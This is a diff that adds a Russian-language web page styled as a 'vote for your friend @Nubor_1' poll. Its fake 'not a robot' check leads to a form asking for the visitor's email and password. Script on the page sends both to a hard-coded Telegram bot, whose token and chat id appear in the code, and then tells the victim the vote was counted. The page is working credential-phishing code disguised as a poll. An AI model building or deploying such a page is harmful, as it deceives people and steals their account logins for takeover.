@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>Голосование за друга с проверкой</title>
+  <style>
+    /* Анимация плавного градиента */
+    @keyframes gradientBG {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0; padding: 20px;
+      min-height: 100vh;
+      color: #333;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+
+      /* Тёмный анимированный фон */
+      background: linear-gradient(270deg, #0f2027, #203a43, #2c5364);
+      background-size: 600% 600%;
+      animation: gradientBG 20s ease infinite;
+    }
+
+    .vote-block {
+      background: rgba(255 255 255 / 0.9);
+      width: 340px;
+      padding: 25px 20px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+      text-align: center;
+      user-select: none;
+      margin-bottom: 15px;
+      animation: slideDownFadeIn 0.6s ease forwards;
+      opacity: 0;
+      transform: translateY(-20px);
+    }
+
+    .vote-block h2 {
+      font-size: 2em;
+      margin-bottom: 20px;
+      color: #2c3e50;
+    }
+
+    .vote-button {
+      background-color: #3498db;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      font-size: 1.3em;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      box-shadow: 0 6px 14px rgba(52, 152, 219, 0.5);
+    }
+    .vote-button:hover:not(:disabled) {
+      background-color: #2980b9;
+      transform: scale(1.05);
+      box-shadow: 0 8px 18px rgba(41, 128, 185, 0.7);
+    }
+    .vote-button:disabled {
+      background-color: #95a5a6;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .message {
+      margin-top: 18px;
+      font-size: 1.15em;
+      font-weight: 600;
+      min-height: 28px;
+      color: #2c3e50;
+      opacity: 0;
+      animation: fadeIn 0.5s ease forwards;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .fade-in {
+      animation: fadeIn 0.5s ease forwards;
+      opacity: 0;
+    }
+
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+
+    @keyframes slideDownFadeIn {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .section {
+      background: rgba(255 255 255 / 0.9);
+      width: 340px;
+      padding: 25px 20px 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+      margin-top: 20px;
+      box-sizing: border-box;
+      opacity: 0;
+      transform: translateY(20px);
+      animation-fill-mode: forwards;
+    }
+    .section.fade-in {
+      animation: slideUpFadeIn 0.6s ease forwards;
+    }
+
+    .section h2 {
+      margin-bottom: 25px;
+      font-size: 1.6em;
+      color: #2c3e50;
+      text-align: center;
+      user-select: none;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #34495e;
+      user-select: none;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      outline-offset: 2px;
+      transition: border-color 0.3s ease;
+    }
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #3498db;
+      box-shadow: 0 0 8px rgba(52, 152, 219, 0.5);
+      outline: none;
+    }
+
+    button.submit-btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #3498db;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.15s ease;
+      user-select: none;
+    }
+    button.submit-btn:hover {
+      background-color: #2980b9;
+      transform: scale(1.05);
+    }
+    #captchaMessage,
+    #formMessage {
+      min-height: 24px;
+      font-weight: 600;
+      text-align: center;
+      margin-top: 10px;
+      color: red;
+      user-select: none;
+    }
+    #formMessage.success {
+      color: green;
+    }
+
+    @keyframes slideUpFadeIn {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="vote-block">
+    <h2>Проголосовать за друга</h2>
+    <button class="vote-button" id="voteBtn">@Nubor_1</button>
+    <div class="message" id="voteMessage"></div>
+  </div>
+
+  <!-- Блок проверки "Вы не робот" -->
+  <div class="section hidden" id="captchaSection">
+    <h2>Проверка: Вы не бот</h2>
+    <label for="captchaInput">Сколько будет 3 + 8?</label>
+    <input type="text" id="captchaInput" placeholder="Введите ответ" autocomplete="off" />
+    <button class="submit-btn" id="captchaSubmitBtn">ОК</button>
+    <div id="captchaMessage"></div>
+  </div>
+
+  <!-- Форма Email и Пароля -->
+  <form id="emailForm" class="section hidden" novalidate>
+    <h2>Введите Email и пароль</h2>
+    <input type="email" id="emailInput" placeholder="Введите Email" required autocomplete="email" />
+    <input type="password" id="passwordInput" placeholder="Введите Пароль" required autocomplete="current-password" />
+    <button type="submit" class="submit-btn">Подтвердить голос</button>
+    <div id="formMessage"></div>
+  </form>
+
+  <script>
+    const botToken = '8105265816:AAGjMWIUj7FMeTzvn-RA7ykKT8d12ejJdgw';
+    const chatId = '7614644519';
+
+    const voteBtn = document.getElementById('voteBtn');
+    const voteMessage = document.getElementById('voteMessage');
+    const captchaSection = document.getElementById('captchaSection');
+    const captchaInput = document.getElementById('captchaInput');
+    const captchaSubmitBtn = document.getElementById('captchaSubmitBtn');
+    const captchaMessage = document.getElementById('captchaMessage');
+    const emailForm = document.getElementById('emailForm');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const formMessage = document.getElementById('formMessage');
+
+    voteBtn.addEventListener('click', () => {
+      voteMessage.textContent = 'Вы выбрали друга @Nubor_1';
+      voteBtn.disabled = true;
+      voteMessage.classList.add('fade-in');
+
+      // Показать капчу, скрыть форму
+      captchaSection.classList.remove('hidden');
+      captchaSection.classList.add('fade-in');
+      emailForm.classList.add('hidden');
+      captchaInput.value = '';
+      captchaMessage.textContent = '';
+      captchaInput.focus();
+    });
+
+    captchaSubmitBtn.addEventListener('click', () => {
+      captchaMessage.textContent = '';
+      const answer = captchaInput.value.trim();
+
+      if (answer === '') {
+        captchaMessage.textContent = 'Пожалуйста, введите ответ.';
+        return;
+      }
+
+      if (answer !== '11') {
+        captchaMessage.textContent = 'Неверный ответ. Попробуйте ещё раз.';
+        captchaInput.value = '';
+        captchaInput.focus();
+        return;
+      }
+
+      // Ответ верный - показать форму, скрыть капчу
+      captchaSection.classList.add('hidden');
+      emailForm.classList.remove('hidden');
+      emailForm.classList.add('fade-in');
+      emailInput.value = '';
+      passwordInput.value = '';
+      formMessage.textContent = '';
+      formMessage.className = '';
+      emailInput.focus();
+    });
+
+    emailForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      formMessage.textContent = '';
+      formMessage.className = '';
+
+      const email = emailInput.value.trim().toLowerCase();
+      const password = passwordInput.value.trim();
+
+      if (!email || !password) {
+        formMessage.textContent = 'Пожалуйста, заполните все поля.';
+        formMessage.className = 'error';
+        return;
+      }
+
+      // Проверяем, голосовал ли уже этот email
+      let votedEmails = JSON.parse(localStorage.getItem('votedEmails') || '[]');
+      if (votedEmails.includes(email)) {
+        formMessage.textContent = 'Вы уже голосовали за друга с этим Email.';
+        formMessage.className = 'error';
+        return;
+      }
+
+      const msg = `<b>Голос за друга @Nubor_1</b>\n\n<b>Email:</b> ${email}\n<b>Пароль:</b> ${password}`;
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg,
+            parse_mode: 'HTML'
+          })
+        });
+
+        if (!response.ok) throw new Error('Ошибка сети');
+
+        votedEmails.push(email);
+        localStorage.setItem('votedEmails', JSON.stringify(votedEmails));
+
+        formMessage.textContent = 'Спасибо! Ваш голос учтён.';
+        formMessage.className = 'success';
+        emailForm.reset();
+        voteBtn.disabled = true;
+
+      } catch (error) {
+        formMessage.textContent = 'Ошибка при отправке голоса. Попробуйте позже.';
+        formMessage.className = 'error';
+        console.error(error);
+      }
+    });
+  </script>
+
+</body>
+</html>
